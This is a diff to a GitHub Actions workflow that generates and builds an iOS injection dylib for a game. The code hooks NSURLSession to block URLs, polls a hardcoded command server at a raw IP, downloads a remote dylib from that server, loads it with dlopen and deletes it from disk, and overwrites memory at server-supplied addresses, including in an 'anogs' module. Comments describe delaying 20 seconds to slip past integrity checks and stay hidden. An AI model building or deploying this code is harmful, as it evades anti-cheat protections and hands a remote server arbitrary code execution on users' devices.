@@ -1,4 +1,4 @@
-name: Sovereign-Pro-Stable-Build
+name: Sovereign-Pro-Build
 
 on:
   push:
@@ -12,9 +12,9 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Generate and Compile Sovereign Core (Pure Dormant Mode)
+      - name: Generate and Compile Sovereign Core
         run: |
-          # Generating Pure English Source Code to prevent any encoding or syntax crashes
+          # Generating Pure English Source Code for Absolute Stability
           cat << 'EOF' > main.mm
           #import <UIKit/UIKit.h>
           #import <mach-o/dyld.h>
@@ -24,12 +24,14 @@ jobs:
           #import <dlfcn.h>
           #import <unistd.h>
 
-          // [1] COMMAND CENTER LINK (General Wsam C2)
-          #define SERVER_API @"http://16.171.230.58/dashboard_v70_pro.php?api=true"
+          // [1] COMMAND CENTER COORDINATES
+          #define SERVER_HOST @"http://16.171.230.58/dashboard_v120k.php"
+          #define SERVER_API @"http://16.171.230.58/dashboard_v120k.php?api=true"
           #define PAYLOAD_URL @"http://16.171.230.58/sovereign_payload.dylib"
           #define WSAM_KEY 0x57 
 
           static BOOL isPayloadInjected = NO;
+          static BOOL isRadarAwake = NO; // المتغير السيادي: يبقي الرادار نائماً في البداية
           static NSMutableArray *blockedUrls = nil;
 
           @interface SovereignSlimHUD : UIView
@@ -40,13 +42,14 @@ jobs:
           @implementation SovereignSlimHUD
 
           // =========================================================
-          // [2] MINIMAL NETWORK SENSOR (Only active for C2 Blocklist)
+          // [2] STEALTH NETWORK SENSOR (Delayed Activation)
           // =========================================================
           + (void)load {
               static dispatch_once_t onceToken;
               dispatch_once(&onceToken, ^{
                   blockedUrls = [[NSMutableArray alloc] init];
-                  // ONLY network is hooked for DNS Sinkhole. No Bundle ID spoofing to prevent crashes.
+                  
+                  // نحن نزرع الهوك في البداية، لكنه "أعمى" حتى نعطيه الأمر
                   Method origNet = class_getInstanceMethod([NSURLSession class], @selector(dataTaskWithRequest:completionHandler:));
                   Method swizNet = class_getInstanceMethod([self class], @selector(sov_dataTaskWithRequest:completionHandler:));
                   method_exchangeImplementations(origNet, swizNet);
@@ -54,19 +57,38 @@ jobs:
           }
 
           - (id)sov_dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error))completionHandler {
+              
+              // 1. إذا كان الرادار نائماً (في أول 20 ثانية)، مرر الاتصال فوراً دون تدخل
+              if (!isRadarAwake) {
+                  return [self sov_dataTaskWithRequest:request completionHandler:completionHandler];
+              }
+
               NSString *url = request.URL.absoluteString;
               
-              // Blocking Logic strictly from Dashboard Orders
+              // 2. كاسر الدوامة: تجاهل روابط سيرفرك الخاص لكي لا ينهار التطبيق
+              if ([url containsString:@"16.171.230.58"] || [url containsString:@"jojolmlm"]) {
+                  return [self sov_dataTaskWithRequest:request completionHandler:completionHandler];
+              }
+
+              // 3. اصطياد الروابط في الخلفية (Background Thread) لكي لا تتجمد اللعبة
+              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+                  // إذا أردت إرسال الرابط للوحة مستقبلاً، يتم هنا بصمت
+                  NSLog(@"[Sovereign Radar] Spotted URL: %@", url);
+              });
+              
+              // 4. خنق الروابط المحظورة (DNS Sinkhole)
               for (NSString *blocked in blockedUrls) {
                   if (blocked.length > 3 && [url containsString:blocked]) {
-                      return nil; // Connection Killed
+                      NSLog(@"[Sovereign Radar] KILLED BLOCKED CONNECTION: %@", blocked);
+                      return nil; // قطع الاتصال مليمتر بمليمتر
                   }
               }
+
               return [self sov_dataTaskWithRequest:request completionHandler:completionHandler];
           }
 
           // =========================================================
-          // [3] VOLATILE PAYLOAD ENGINE (Triggered by Dashboard Only)
+          // [3] VOLATILE PAYLOAD (Triggered by Dashboard Only)
           // =========================================================
           - (void)igniteVolatilePulse {
               [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:PAYLOAD_URL] completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
@@ -83,39 +105,37 @@ jobs:
                   void *h = dlopen([path UTF8String], RTLD_NOW);
                   if (h) {
                       isPayloadInjected = YES;
-                      unlink([path UTF8String]); // Purge from disk
+                      unlink([path UTF8String]); 
+                      dispatch_async(dispatch_get_main_queue(), ^{
+                          self.statusLabel.text = @"PAYLOAD INJECTED ✅";
+                          self.statusLabel.textColor = [UIColor greenColor];
+                      });
                   }
               }] resume];
           }
 
           // =========================================================
-          // [4] DYNAMIC PATCH ENGINE (Triggered by Dashboard Only)
+          // [4] DYNAMIC PATCH ENGINE (Memory Patching)
           // =========================================================
-          - (void)executeDynamicPatches:(NSArray *)payloads {
-              uintptr_t mainBase = _dyld_get_image_vmaddr_slide(0);
-              mach_port_t task = mach_task_self();
+          - (void)executePatches:(NSArray *)payloads {
+              uintptr_t shadowBase = _dyld_get_image_vmaddr_slide(0);
+              uintptr_t anogsBase = 0;
+              uint32_t count = _dyld_image_count();
+              for (uint32_t i = 0; i < count; i++) {
+                  const char *name = _dyld_get_image_name(i);
+                  if (name && strstr(name, "anogs")) { anogsBase = _dyld_get_image_vmaddr_slide(i); break; }
+              }
 
+              mach_port_t task = mach_task_self();
               for (NSDictionary *patch in payloads) {
                   NSString *targetFile = patch[@"file_name"];
-                  NSString *hexStr = patch[@"hex_val"];
-                  uintptr_t addr = strtoull([patch[@"address"] UTF8String], NULL, 16);
-                  
-                  // Dynamic Base Resolution (No hardcoded packages)
-                  uintptr_t finalSlide = 0;
-                  uint32_t count = _dyld_image_count();
-                  for (uint32_t i = 0; i < count; i++) {
-                      const char *name = _dyld_get_image_name(i);
-                      if (name && strstr(name, [targetFile UTF8String])) {
-                          finalSlide = _dyld_get_image_vmaddr_slide(i);
-                          break;
-                      }
-                  }
-                  
-                  // If target not found, fallback to main executable
-                  if (finalSlide == 0) finalSlide = mainBase;
-                  uintptr_t targetAddr = finalSlide + addr;
+                  uintptr_t base = ([targetFile containsString:@"anogs"]) ? anogsBase : shadowBase;
+                  if (base == 0) continue;
 
-                  // Parse Hex
+                  uintptr_t addr = strtoull([patch[@"address"] UTF8String], NULL, 16);
+                  uintptr_t targetAddr = base + addr;
+                  NSString *hexStr = patch[@"hex_val"];
+                  
                   NSString *cleanHex = [hexStr stringByReplacingOccurrencesOfString:@" " withString:@""];
                   if ([cleanHex hasPrefix:@"0x"]) cleanHex = [cleanHex substringFromIndex:2];
                   
@@ -125,7 +145,6 @@ jobs:
                       unsigned char c = (unsigned char)v; [data appendBytes:&c length:1];
                   }
 
-                  // Safe Injection
                   kern_return_t kr = vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
                   if (kr == KERN_SUCCESS) {
                       vm_write(task, (vm_address_t)targetAddr, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
@@ -181,18 +200,13 @@ jobs:
                       NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                       if (!json) return;
 
-                      // 1. Maintenance Lockdown Check
                       if ([json[@"maintenance"] intValue] == 1) { [self showLockdown:json[@"lock_msg"]]; return; }
-
-                      // 2. Volatile Payload Trigger
                       if ([json[@"payload_status"] intValue] == 1 && !isPayloadInjected) { [self igniteVolatilePulse]; }
 
-                      // 3. Update Blacklist
                       [blockedUrls removeAllObjects];
                       if (json[@"blocked_urls"]) [blockedUrls addObjectsFromArray:json[@"blocked_urls"]];
 
-                      // 4. Apply Dynamic Patches (Only what is sent from Dashboard)
-                      if (json[@"payload"]) { [self executeDynamicPatches:json[@"payload"]]; }
+                      if (json[@"payload"]) { [self executePatches:json[@"payload"]]; }
 
                       self.statusLabel.text = json[@"notification"];
                       if ([json[@"status"] isEqualToString:@"safe"]) {
@@ -205,7 +219,6 @@ jobs:
                   });
               }] resume];
               
-              // Poll every 10 seconds
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self startSyncLoop]; });
           }
 
@@ -228,8 +241,13 @@ jobs:
           @end
 
           void __attribute__((constructor)) start_dormant_core() {
-              // Wait 12 seconds to let the game fully load and bypass initial integrity checks
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(12 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+              // 1. ننتظر 20 ثانية صمت تام (حتى تدخل اللعبة للوبي وتستقر)
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(20 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                  
+                  // 2. إيقاظ رادار الشبكة صمتاً (سيبدأ بحجب الروابط في الخلفية)
+                  isRadarAwake = YES;
+                  
+                  // 3. إظهار واجهة الشريط الأنيق
                   UIWindow *win = nil;
                   if (@available(iOS 13.0, *)) {
                       for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
@@ -240,7 +258,6 @@ jobs:
                   
                   if (win) {
                       CGFloat sw = [UIScreen mainScreen].bounds.size.width;
-                      // Sleek, fixed top-center UI
                       SovereignSlimHUD *ui = [[SovereignSlimHUD alloc] initWithFrame:CGRectMake((sw - 280) / 2, 45, 280, 30)];
                       [win addSubview:ui];
                   }
@@ -248,7 +265,6 @@ jobs:
           }
           EOF
 
-          # [!] Compiling the Dylib with Official Apple SDK (Linking C++ Standard Library)
           export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
           clang -dynamiclib -arch arm64 main.mm -o Sovereign_Stable.dylib \
           -isysroot $SDK_PATH \
